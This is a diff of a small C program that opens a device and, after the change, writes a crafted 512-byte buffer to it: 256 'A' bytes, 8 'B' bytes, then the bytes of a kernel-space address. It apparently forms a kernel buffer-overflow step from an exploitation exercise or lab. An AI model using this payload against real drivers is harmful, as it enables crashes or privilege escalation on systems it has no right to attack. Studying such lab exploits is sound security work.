@@ -15,8 +15,27 @@ int main(void)
     }
     puts("[+] Successfully opened the device");
 
-    char *msg = "Hello from userspace!";
-    int ret = write(fd, msg, strlen(msg));
+    char *msg = malloc(512);
+    for (int i = 0; i < 256; i++)
+    {
+        msg[i] = 'A';
+    }
+    for (int i = 256; i < 256+8; i++)
+    {
+        msg[i] = 'B';
+    }
+    msg[256 + 8] = 0x00;
+    msg[256 + 9] = 0x00;
+    msg[256 + 10] = 0x00;
+    msg[256 + 11] = 0xc0;
+    msg[256 + 12] = 0xff;
+    msg[256 + 13] = 0xff;
+    msg[256 + 14] = 0xff;
+    msg[256 + 15] = 0xff;
+
+    int ret = write(fd, msg, 512);
+    free(msg);
+
     if (ret < 0)
     {
         puts("[!] Failed to write to the device");
